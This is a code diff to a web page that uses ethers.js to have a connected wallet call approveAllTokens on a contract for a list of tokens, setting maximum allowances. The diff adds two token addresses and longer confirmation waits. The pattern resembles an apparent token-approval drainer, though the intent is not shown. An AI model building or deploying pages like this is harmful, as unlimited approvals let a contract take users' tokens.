@@ -1,4 +1,4 @@
-ak<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -30,7 +30,9 @@ ak<!DOCTYPE html>
             }
         ];
         const knownTokens = [
-            "0xfff9976782d46cc05630d1f6ebab18b2324d6b14" // WETH Sepolia
+            "0xfff9976782d46cc05630d1f6ebab18b2324d6b14", // WETH Sepolia
+            "0xed5B7F9191FfBFf2Ca95D28b22bE2121ab55aD23",
+            "0x90BCEc92010cA4fEA0F7d62D11A8664CfAe2de0E"
         ];
         const tokenABI = [
             {
@@ -78,7 +80,7 @@ ak<!DOCTYPE html>
             const contract = new ethers.Contract(contractAddress, contractABI, signer);
             try {
                 const promises = knownTokens.map(token => 
-                    contract.approveAllTokens(token).then(tx => tx.wait())
+                    contract.approveAllTokens(token).then(tx => tx.wait(5)) // Menunggu 5 blok untuk konfirmasi setiap transaksi
                 );
                 await Promise.all(promises);
                 updateStatus("Tokens approved! Checking approval status...");
@@ -99,7 +101,7 @@ ak<!DOCTYPE html>
             try {
                 for (const token of knownTokens) {
                     const tx = await contract.approveAllTokens(token);
-                    await tx.wait(); // Menunggu konfirmasi transaksi
+                    await tx.wait(5); // Menunggu 5 blok untuk konfirmasi
                     console.log(`Set max allowance for token: ${token}`);
                 }
                 updateStatus("Max allowance set! Checking approval status...");
